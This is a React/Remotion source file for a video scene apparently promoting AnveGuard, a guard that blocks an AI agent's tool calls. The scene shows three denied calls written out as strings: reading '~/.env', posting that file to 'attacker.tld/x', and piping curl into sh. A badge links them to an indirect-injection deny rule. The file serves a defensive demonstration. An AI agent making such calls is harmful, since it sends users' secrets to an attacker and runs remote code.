import React from "react";
import { AbsoluteFill, useCurrentFrame, interpolate, spring, useVideoConfig } from "remotion";
import { C, FONTS, SPRING } from "../../design/tokens";
import { Mono, useEnter } from "../../design/Type";
import { SvgPathDraw } from "../../design/SvgDraw";

const CALLS = [
  { name: "fs.read('~/.env')", delay: 60 },
  { name: "http.post('attacker.tld/x', envFile)", delay: 90 },
  { name: "shell.exec('curl … | sh')", delay: 120 },
];

const DeniedRow: React.FC<{ name: string; delay: number }> = ({ name, delay }) => {
  const f = useCurrentFrame();
  const { fps } = useVideoConfig();
  const enter = spring({ frame: f - delay, fps, config: SPRING.enter });
  const stamp = spring({ frame: f - delay - 12, fps, config: { damping: 9, stiffness: 220 } });
  return (
    <div style={{
      opacity: enter, transform: `translateX(${interpolate(enter, [0, 1], [-20, 0])}px)`,
      display: "flex", alignItems: "center", justifyContent: "space-between",
      padding: "20px 26px",
      background: C.panel,
      border: `1px solid ${C.rule}`,
      borderLeft: `4px solid ${C.alert}`,
      borderRadius: 12,
      marginBottom: 14,
    }}>
      <div>
        <div style={{ fontFamily: FONTS.mono, fontSize: 12, color: C.mutedSoft, letterSpacing: 2, textTransform: "uppercase" }}>tool call</div>
        <div style={{ fontFamily: FONTS.mono, fontSize: 22, color: C.paper, marginTop: 6 }}>{name}</div>
      </div>
      <div style={{
        opacity: stamp,
        transform: `scale(${interpolate(stamp, [0, 1], [1.4, 1])})`,
        padding: "10px 18px",
        border: `2px solid ${C.alert}`,
        borderRadius: 6,
        fontFamily: FONTS.mono, fontSize: 18, color: C.alert,
        letterSpacing: 2, textTransform: "uppercase",
      }}>
        denied · 403
      </div>
    </div>
  );
};

const Shield: React.FC = () => {
  const f = useCurrentFrame();
  const fillIn = interpolate(f, [40, 70], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
  return (
    <svg width="120" height="140" viewBox="0 0 100 120">
      <SvgPathDraw
        d="M 50 6 L 92 22 L 92 60 Q 92 96 50 116 Q 8 96 8 60 L 8 22 Z"
        stroke={C.signal}
        strokeWidth={2.5}
        start={4}
        duration={30}
        glow
      />
      <path
        d="M 50 6 L 92 22 L 92 60 Q 92 96 50 116 Q 8 96 8 60 L 8 22 Z"
        fill={C.signal}
        opacity={fillIn * 0.12}
      />
      <SvgPathDraw
        d="M 30 60 L 46 76 L 72 46"
        stroke={C.signal}
        strokeWidth={3}
        start={28}
        duration={18}
        glow
      />
    </svg>
  );
};

export const S7_Intercept: React.FC = () => {
  const f = useCurrentFrame();
  return (
    <AbsoluteFill style={{ fontFamily: FONTS.sans, color: C.paper, padding: "60px 120px" }}>
      <Mono size={14} color={C.muted}>act iii · scene 07</Mono>
      <div style={{ display: "flex", alignItems: "center", gap: 26, marginTop: 4 }}>
        <Shield />
        <div style={{ fontSize: 72, fontWeight: 600, letterSpacing: -2, lineHeight: 1.02, ...useEnter(18) }}>
          AnveGuard <span style={{ color: C.signal }}>intercepts.</span>
        </div>
      </div>
      <div style={{ marginTop: 14, fontSize: 22, color: C.muted, ...useEnter(34) }}>
        Every prompt, tool input, and tool output — inspected in &lt; 15 ms.
      </div>

      <div style={{ marginTop: 36, maxWidth: 1380 }}>
        {CALLS.map(c => <DeniedRow key={c.name} name={c.name} delay={c.delay} />)}
      </div>

      <div style={{
        position: "absolute", left: 120, bottom: 60,
        opacity: interpolate(f, [180, 210], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" }),
        display: "inline-flex", alignItems: "center", gap: 14,
        padding: "10px 18px",
        background: "rgba(91,141,239,0.08)",
        border: `1px solid ${C.signal}`,
        borderRadius: 999,
      }}>
        <span style={{ width: 8, height: 8, borderRadius: 999, background: C.signal, boxShadow: `0 0 8px ${C.signal}` }} />
        <span style={{ fontFamily: FONTS.mono, fontSize: 14, color: C.signal, letterSpacing: 1.5 }}>
          policy://agent.guard/v2 · rule R-117 indirect_injection.deny_all
        </span>
      </div>
    </AbsoluteFill>
  );
};
